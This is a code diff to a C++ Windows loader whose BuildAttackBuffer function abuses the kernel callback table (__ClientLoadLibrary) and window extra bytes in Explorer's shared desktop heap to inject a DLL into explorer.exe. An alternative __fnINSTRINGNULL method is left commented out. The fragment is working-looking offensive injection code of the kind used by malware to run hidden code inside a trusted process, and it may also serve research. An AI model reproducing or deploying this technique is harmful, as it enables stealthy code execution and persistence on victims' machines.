@@ -1,5 +1,6 @@
 #include "Loader.h"
 #include "ProcessUtils.h"
+#include "apfnDispatch.h"
 #include "Log.h"
 
 #include <io.h>
@@ -187,20 +188,22 @@ PVOID Loader::FindExplorerDesktopHeap(SIZE_T HeapSize)
 
 PVOID Loader::BuildAttackBuffer(const TCHAR * dllPath)
 {
-	PVOID pfnLoadLibrary = (PVOID)GetProcAddress(LoadLibrary(_T("kernel32.dll")), "LoadLibraryA");
 	UINT CurrIndex = 0;
-#define _fnINSTRINGNULL_INDEX 27
-#define __ClientLoadLibrary_INDEX 74
 
 	// Get the callback table.
 	PTEB Teb = NtCurrentTeb();
 	PBYTE Peb = (PBYTE)Teb->ProcessEnvironmentBlock;
 	PVOID* CallbackTable = *(PVOID**)((PBYTE)Peb + 0x58);
-	PVOID TargetFunction = CallbackTable[__ClientLoadLibrary_INDEX];
-	PrintOut(_T("TargetFunction: 0x%IX\n"), TargetFunction);
+	
 	PrintOut(_T("ExplorerSharedHeap: 0x%IX\n"), (size_t)m_pExplorerSharedHeap + m_WindowBufferOffset);
 
-#define SET_LONG(value) SetWindowLongPtr(m_hWnd, CurrIndex  * sizeof(LONG_PTR), (LONG_PTR)value);CurrIndex++;
+#define SET_LONG(value) SetWindowLongPtr(m_hWnd, CurrIndex  * sizeof(LONG_PTR), (LONG_PTR)value); CurrIndex++;
+
+	/*
+	* Method using __ClientLoadLibrary
+	*/
+	PVOID TargetFunction = CallbackTable[__ClientLoadLibrary_INDEX];
+
 	SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + 16); // 0x00
 	// Must be zero
 	SET_LONG(0); // 0x08
@@ -216,8 +219,14 @@ PVOID Loader::BuildAttackBuffer(const TCHAR * dllPath)
 	// Must be zero	
 	SET_LONG(0); // 0x38
 	SET_LONG(0); // 0x40
+	// Write dll path for injection
 	SetLibraryPathW(dllPath, CurrIndex);
 
+	/*
+	* Method using __fnINSTRINGNULL
+	*/
+	//PVOID TargetFunction = CallbackTable[__fnINSTRINGNULL_INDEX];
+	//
 	//SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + sizeof(LONG_PTR) * 2); // 0x00
 	//// Must be zero
 	//SET_LONG(0); // 0x08
@@ -237,6 +246,7 @@ PVOID Loader::BuildAttackBuffer(const TCHAR * dllPath)
 	//SET_LONG(pfnLoadLibrary); // This is the LoadLibraryFunction
 	//
 	//SetLibraryPath(dllPath, CurrIndex);
+
 #undef SET_LONG
 
 	return (PVOID)((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset);
